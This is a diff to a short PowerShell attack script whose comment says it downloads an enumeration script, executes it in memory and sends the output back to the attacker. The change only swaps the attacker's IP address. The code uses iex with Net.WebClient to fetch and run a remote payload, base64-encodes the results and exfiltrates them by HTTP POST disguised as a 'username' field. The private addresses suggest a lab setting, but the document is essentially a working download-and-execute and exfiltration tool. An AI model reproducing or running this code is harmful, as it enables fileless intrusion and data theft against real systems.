@@ -1,4 +1,4 @@
-﻿
+
 <#
     script used todownload the enumerationscript, execute in memory and send the output back to attacker
     Author: Luca Saija 
@@ -18,10 +18,10 @@
 
     #>
 
-$enum = iex (New-Object Net.WebClient).downloadString('http://10.0.2.15:8080/enumScript.ps1')
+$enum = iex (New-Object Net.WebClient).downloadString('http://10.0.2.4:8080/enumScript.ps1')
 $encoderesults = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($enum))
 
 #send data back to attacker
 $postParams = @{username=$encoderesults;}
 $postParams
-Invoke-WebRequest -Uri http://10.0.2.15:443/ -Method POST -Body $postParams
+Invoke-WebRequest -Uri http://10.0.2.4:443/ -Method POST -Body $postParams
